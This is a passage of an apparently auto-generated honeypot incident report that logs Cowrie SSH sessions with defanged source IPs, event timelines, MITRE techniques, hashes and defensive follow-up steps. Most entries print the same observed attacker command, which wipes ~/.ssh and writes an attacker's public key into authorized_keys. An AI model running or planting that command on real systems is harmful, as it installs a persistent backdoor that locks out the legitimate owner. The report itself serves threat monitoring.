| `2026-04-17 07:17:12` | `cowrie.client.version` |
| `2026-04-17 07:17:12` | `cowrie.client.kex` |
| `2026-04-17 07:17:13` | `cowrie.login.success` |
| `2026-04-17 07:17:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.29[.]97` to AbuseIPDB if not already reported
- [ ] Block `34.78.29[.]97` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc737d4d81cc

| Field | Detail |
|---|---|
| **Source IP** | `182.52.109[.]76` |
| **First Seen** | 2026-04-17 07:20 |
| **Last Seen** | 2026-04-17 07:20 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 07:20:26` | `cowrie.session.connect` |
| `2026-04-17 07:20:26` | `cowrie.client.version` |
| `2026-04-17 07:20:27` | `cowrie.client.kex` |
| `2026-04-17 07:20:27` | `cowrie.login.success` |
| `2026-04-17 07:20:28` | `cowrie.session.params` |
| `2026-04-17 07:20:28` | `cowrie.command.input` |
| `2026-04-17 07:20:28` | `cowrie.command.failed` |
| `2026-04-17 07:20:28` | `cowrie.log.closed` |
| `2026-04-17 07:20:29` | `cowrie.session.params` |
| `2026-04-17 07:20:29` | `cowrie.command.input` |
| `2026-04-17 07:20:29` | `cowrie.session.file_download` |
| `2026-04-17 07:20:29` | `cowrie.log.closed` |
| `2026-04-17 07:20:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.52.109[.]76` to AbuseIPDB if not already reported
- [ ] Block `182.52.109[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7376b6dfec98

| Field | Detail |
|---|---|
| **Source IP** | `182.52.109[.]76` |
| **First Seen** | 2026-04-17 07:20 |
| **Last Seen** | 2026-04-17 07:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 07:20:31` | `cowrie.session.connect` |
| `2026-04-17 07:20:31` | `cowrie.client.version` |
| `2026-04-17 07:20:31` | `cowrie.client.kex` |
| `2026-04-17 07:20:32` | `cowrie.login.success` |
| `2026-04-17 07:20:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.52.109[.]76` to AbuseIPDB if not already reported
- [ ] Block `182.52.109[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3df4d3970aff

| Field | Detail |
|---|---|
| **Source IP** | `206.42.14[.]196` |
| **First Seen** | 2026-04-17 07:20 |
| **Last Seen** | 2026-04-17 07:21 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 07:20:56` | `cowrie.session.connect` |
| `2026-04-17 07:20:56` | `cowrie.client.version` |
| `2026-04-17 07:20:56` | `cowrie.client.kex` |
| `2026-04-17 07:20:57` | `cowrie.login.success` |
| `2026-04-17 07:20:58` | `cowrie.session.params` |
| `2026-04-17 07:20:58` | `cowrie.command.input` |
| `2026-04-17 07:20:58` | `cowrie.command.failed` |
| `2026-04-17 07:20:58` | `cowrie.log.closed` |
| `2026-04-17 07:20:59` | `cowrie.session.params` |
| `2026-04-17 07:20:59` | `cowrie.command.input` |
| `2026-04-17 07:20:59` | `cowrie.session.file_download` |
| `2026-04-17 07:20:59` | `cowrie.log.closed` |
| `2026-04-17 07:21:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.42.14[.]196` to AbuseIPDB if not already reported
- [ ] Block `206.42.14[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2557f168c3f

| Field | Detail |
|---|---|
| **Source IP** | `206.42.14[.]196` |
| **First Seen** | 2026-04-17 07:21 |
| **Last Seen** | 2026-04-17 07:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 07:21:03` | `cowrie.session.connect` |
| `2026-04-17 07:21:03` | `cowrie.client.version` |
| `2026-04-17 07:21:03` | `cowrie.client.kex` |
| `2026-04-17 07:21:04` | `cowrie.login.success` |
| `2026-04-17 07:21:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.42.14[.]196` to AbuseIPDB if not already reported
- [ ] Block `206.42.14[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2cad1080e043

| Field | Detail |
|---|---|
| **Source IP** | `206.42.14[.]196` |
| **First Seen** | 2026-04-17 07:22 |
| **Last Seen** | 2026-04-17 07:22 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 07:22:37` | `cowrie.session.connect` |
| `2026-04-17 07:22:37` | `cowrie.client.version` |
| `2026-04-17 07:22:37` | `cowrie.client.kex` |
| `2026-04-17 07:22:38` | `cowrie.login.success` |
| `2026-04-17 07:22:39` | `cowrie.session.params` |
| `2026-04-17 07:22:39` | `cowrie.command.input` |
| `2026-04-17 07:22:39` | `cowrie.command.failed` |
| `2026-04-17 07:22:39` | `cowrie.log.closed` |
| `2026-04-17 07:22:40` | `cowrie.session.params` |
| `2026-04-17 07:22:40` | `cowrie.command.input` |
| `2026-04-17 07:22:40` | `cowrie.session.file_download` |
| `2026-04-17 07:22:40` | `cowrie.log.closed` |
| `2026-04-17 07:22:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.42.14[.]196` to AbuseIPDB if not already reported
- [ ] Block `206.42.14[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf54f3419d0c

| Field | Detail |
|---|---|
| **Source IP** | `206.42.14[.]196` |
| **First Seen** | 2026-04-17 07:22 |
| **Last Seen** | 2026-04-17 07:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 07:22:43` | `cowrie.session.connect` |
| `2026-04-17 07:22:43` | `cowrie.client.version` |
| `2026-04-17 07:22:44` | `cowrie.client.kex` |
| `2026-04-17 07:22:45` | `cowrie.login.success` |
| `2026-04-17 07:22:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.42.14[.]196` to AbuseIPDB if not already reported
- [ ] Block `206.42.14[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c3a07d499b3

| Field | Detail |
|---|---|
| **Source IP** | `206.42.14[.]196` |
| **First Seen** | 2026-04-17 07:24 |
| **Last Seen** | 2026-04-17 07:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 07:24:20` | `cowrie.session.connect` |
| `2026-04-17 07:24:20` | `cowrie.client.version` |
| `2026-04-17 07:24:21` | `cowrie.client.kex` |
| `2026-04-17 07:24:22` | `cowrie.login.success` |
| `2026-04-17 07:24:23` | `cowrie.session.params` |
| `2026-04-17 07:24:23` | `cowrie.command.input` |
| `2026-04-17 07:24:23` | `cowrie.command.failed` |
| `2026-04-17 07:24:23` | `cowrie.log.closed` |
| `2026-04-17 07:24:23` | `cowrie.session.params` |
| `2026-04-17 07:24:23` | `cowrie.command.input` |
| `2026-04-17 07:24:24` | `cowrie.session.file_download` |
| `2026-04-17 07:24:24` | `cowrie.log.closed` |
| `2026-04-17 07:24:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.42.14[.]196` to AbuseIPDB if not already reported
- [ ] Block `206.42.14[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12e8d74a9960

| Field | Detail |
|---|---|
| **Source IP** | `206.42.14[.]196` |
| **First Seen** | 2026-04-17 07:24 |
| **Last Seen** | 2026-04-17 07:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 07:24:27` | `cowrie.session.connect` |
| `2026-04-17 07:24:27` | `cowrie.client.version` |
| `2026-04-17 07:24:27` | `cowrie.client.kex` |
| `2026-04-17 07:24:29` | `cowrie.login.success` |
| `2026-04-17 07:24:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.42.14[.]196` to AbuseIPDB if not already reported
- [ ] Block `206.42.14[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-276d744b2833

| Field | Detail |
|---|---|
| **Source IP** | `206.42.14[.]196` |
| **First Seen** | 2026-04-17 07:26 |
| **Last Seen** | 2026-04-17 07:26 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 07:26:01` | `cowrie.session.connect` |
| `2026-04-17 07:26:01` | `cowrie.client.version` |
| `2026-04-17 07:26:01` | `cowrie.client.kex` |
| `2026-04-17 07:26:02` | `cowrie.login.success` |
| `2026-04-17 07:26:03` | `cowrie.session.params` |
| `2026-04-17 07:26:03` | `cowrie.command.input` |
| `2026-04-17 07:26:03` | `cowrie.command.failed` |
| `2026-04-17 07:26:03` | `cowrie.log.closed` |
| `2026-04-17 07:26:04` | `cowrie.session.params` |
| `2026-04-17 07:26:04` | `cowrie.command.input` |
| `2026-04-17 07:26:04` | `cowrie.session.file_download` |
| `2026-04-17 07:26:04` | `cowrie.log.closed` |
| `2026-04-17 07:26:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.42.14[.]196` to AbuseIPDB if not already reported
- [ ] Block `206.42.14[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53f1d3046a61

| Field | Detail |
|---|---|
| **Source IP** | `206.42.14[.]196` |
| **First Seen** | 2026-04-17 07:26 |
| **Last Seen** | 2026-04-17 07:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 07:26:07` | `cowrie.session.connect` |
| `2026-04-17 07:26:07` | `cowrie.client.version` |
| `2026-04-17 07:26:08` | `cowrie.client.kex` |
| `2026-04-17 07:26:09` | `cowrie.login.success` |
| `2026-04-17 07:26:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `206.42.14[.]196` to AbuseIPDB if not already reported
- [ ] Block `206.42.14[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd0a05e81b86

| Field | Detail |
|---|---|
| **Source IP** | `182.52.109[.]76` |
| **First Seen** | 2026-04-17 07:27 |
| **Last Seen** | 2026-04-17 07:27 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 07:27:25` | `cowrie.session.connect` |
| `2026-04-17 07:27:25` | `cowrie.client.version` |
| `2026-04-17 07:27:26` | `cowrie.client.kex` |
| `2026-04-17 07:27:26` | `cowrie.login.success` |
| `2026-04-17 07:27:27` | `cowrie.session.params` |
| `2026-04-17 07:27:27` | `cowrie.command.input` |
| `2026-04-17 07:27:27` | `cowrie.command.failed` |
| `2026-04-17 07:27:27` | `cowrie.log.closed` |
| `2026-04-17 07:27:27` | `cowrie.session.params` |
| `2026-04-17 07:27:27` | `cowrie.command.input` |
| `2026-04-17 07:27:28` | `cowrie.session.file_download` |
| `2026-04-17 07:27:28` | `cowrie.log.closed` |
| `2026-04-17 07:27:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.52.109[.]76` to AbuseIPDB if not already reported
- [ ] Block `182.52.109[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-289858a8e19f

| Field | Detail |
|---|---|
| **Source IP** | `182.52.109[.]76` |
| **First Seen** | 2026-04-17 07:27 |
| **Last Seen** | 2026-04-17 07:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 07:27:30` | `cowrie.session.connect` |
| `2026-04-17 07:27:30` | `cowrie.client.version` |
| `2026-04-17 07:27:30` | `cowrie.client.kex` |
| `2026-04-17 07:27:31` | `cowrie.login.success` |
| `2026-04-17 07:27:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.52.109[.]76` to AbuseIPDB if not already reported
- [ ] Block `182.52.109[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f3745e07e27

| Field | Detail |
|---|---|
| **Source IP** | `182.52.109[.]76` |
| **First Seen** | 2026-04-17 07:37 |
| **Last Seen** | 2026-04-17 07:37 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 07:37:44` | `cowrie.session.connect` |
| `2026-04-17 07:37:44` | `cowrie.client.version` |
| `2026-04-17 07:37:44` | `cowrie.client.kex` |
| `2026-04-17 07:37:45` | `cowrie.login.success` |
| `2026-04-17 07:37:46` | `cowrie.session.params` |
| `2026-04-17 07:37:46` | `cowrie.command.input` |
| `2026-04-17 07:37:46` | `cowrie.command.failed` |
| `2026-04-17 07:37:46` | `cowrie.log.closed` |
| `2026-04-17 07:37:46` | `cowrie.session.params` |
| `2026-04-17 07:37:46` | `cowrie.command.input` |
| `2026-04-17 07:37:47` | `cowrie.session.file_download` |
| `2026-04-17 07:37:47` | `cowrie.log.closed` |
| `2026-04-17 07:37:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.52.109[.]76` to AbuseIPDB if not already reported
- [ ] Block `182.52.109[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-448b1b678678

| Field | Detail |
|---|---|
| **Source IP** | `182.52.109[.]76` |
| **First Seen** | 2026-04-17 07:37 |
| **Last Seen** | 2026-04-17 07:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 07:37:49` | `cowrie.session.connect` |
| `2026-04-17 07:37:49` | `cowrie.client.version` |
| `2026-04-17 07:37:49` | `cowrie.client.kex` |
| `2026-04-17 07:37:50` | `cowrie.login.success` |
| `2026-04-17 07:37:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.52.109[.]76` to AbuseIPDB if not already reported
- [ ] Block `182.52.109[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4aa007edf7f7

| Field | Detail |
|---|---|
| **Source IP** | `14.103.113[.]212` |
| **First Seen** | 2026-04-17 09:01 |
| **Last Seen** | 2026-04-17 09:01 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:01:28` | `cowrie.session.connect` |
| `2026-04-17 09:01:28` | `cowrie.client.version` |
| `2026-04-17 09:01:28` | `cowrie.client.kex` |
| `2026-04-17 09:01:28` | `cowrie.login.success` |
| `2026-04-17 09:01:29` | `cowrie.session.params` |
| `2026-04-17 09:01:29` | `cowrie.command.input` |
| `2026-04-17 09:01:29` | `cowrie.command.failed` |
| `2026-04-17 09:01:29` | `cowrie.log.closed` |
| `2026-04-17 09:01:29` | `cowrie.session.params` |
| `2026-04-17 09:01:29` | `cowrie.command.input` |
| `2026-04-17 09:01:30` | `cowrie.session.file_download` |
| `2026-04-17 09:01:30` | `cowrie.log.closed` |
| `2026-04-17 09:01:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.113[.]212` to AbuseIPDB if not already reported
- [ ] Block `14.103.113[.]212` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96b8be50eece

| Field | Detail |
|---|---|
| **Source IP** | `14.103.113[.]212` |
| **First Seen** | 2026-04-17 09:01 |
| **Last Seen** | 2026-04-17 09:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-17 09:01:32` | `cowrie.session.connect` |
| `2026-04-17 09:01:32` | `cowrie.client.version` |
| `2026-04-17 09:01:32` | `cowrie.client.kex` |
| `2026-04-17 09:01:34` | `cowrie.login.success` |
| `2026-04-17 09:01:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.113[.]212` to AbuseIPDB if not already reported
- [ ] Block `14.103.113[.]212` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22796c11c1bc

| Field | Detail |
|---|---|
| **Source IP** | `14.103.121[.]146` |
| **First Seen** | 2026-04-17 09:05 |
| **Last Seen** | 2026-04-17 09:05 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
